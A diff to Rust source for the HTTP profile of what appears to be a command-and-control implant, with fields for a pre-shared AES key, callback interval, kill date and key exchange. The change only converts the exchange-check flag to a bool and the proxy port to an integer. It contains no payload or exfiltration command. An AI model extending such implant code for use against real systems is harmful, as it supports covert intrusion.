@@ -31,7 +31,7 @@ pub struct HttpInitialConfig {
     #[serde(rename = "query_path_name")]
     pub query_path_name: String,
     #[serde(rename = "encrypted_exchange_check")]
-    pub encrypted_exchange_check: String,
+    pub encrypted_exchange_check: bool,
     #[serde(rename = "AESPSK")]
     pub aes_psk: String,
     #[serde(rename = "callback_interval")]
@@ -45,7 +45,7 @@ pub struct HttpInitialConfig {
     #[serde(rename = "proxy_host", default)]
     pub proxy_host: String,
     #[serde(rename = "proxy_port", default)]
-    pub proxy_port: String,
+    pub proxy_port: i32,
     #[serde(rename = "proxy_user", default)]
     pub proxy_user: String,
     #[serde(rename = "proxy_pass", default)]
@@ -58,7 +58,7 @@ pub struct HttpProfile {
     post_uri: RwLock<String>,
     get_uri: RwLock<String>,
     query_path_name: RwLock<String>,
-    encrypted_exchange_check: RwLock<String>,
+    encrypted_exchange_check: RwLock<bool>,
     aes_key: RwLock<Option<Vec<u8>>>,
     uuid: RwLock<String>,
     interval: AtomicI32,
@@ -66,7 +66,7 @@ pub struct HttpProfile {
     killdate: RwLock<NaiveDate>,
     headers: RwLock<HashMap<String, String>>,
     proxy_host: RwLock<String>,
-    proxy_port: RwLock<String>,
+    proxy_port: AtomicI32,
     proxy_user: RwLock<String>,
     proxy_pass: RwLock<String>,
     running: AtomicBool,
@@ -98,7 +98,7 @@ impl HttpProfile {
             killdate: RwLock::new(killdate),
             headers: RwLock::new(config.headers),
             proxy_host: RwLock::new(config.proxy_host),
-            proxy_port: RwLock::new(config.proxy_port),
+            proxy_port: AtomicI32::new(config.proxy_port),
             proxy_user: RwLock::new(config.proxy_user),
             proxy_pass: RwLock::new(config.proxy_pass),
             running: AtomicBool::new(false),
@@ -126,7 +126,7 @@ impl HttpProfile {
 
         let proxy_host = self.proxy_host.read().unwrap();
         if !proxy_host.is_empty() {
-            let proxy_port = self.proxy_port.read().unwrap();
+            let proxy_port = self.proxy_port.load(Ordering::Relaxed);
             let proxy_url = format!("{}:{}", proxy_host, proxy_port);
             if let Ok(proxy) = reqwest::Proxy::all(&proxy_url) {
                 let proxy_user = self.proxy_user.read().unwrap();
@@ -257,8 +257,8 @@ impl HttpProfile {
 
     /// Perform EKE key exchange
     async fn negotiate_key(&self) -> bool {
-        let exchange_check = self.encrypted_exchange_check.read().unwrap().clone();
-        if exchange_check != "T" {
+        let exchange_check = *self.encrypted_exchange_check.read().unwrap();
+        if !exchange_check {
             return true; // No exchange needed
         }
 
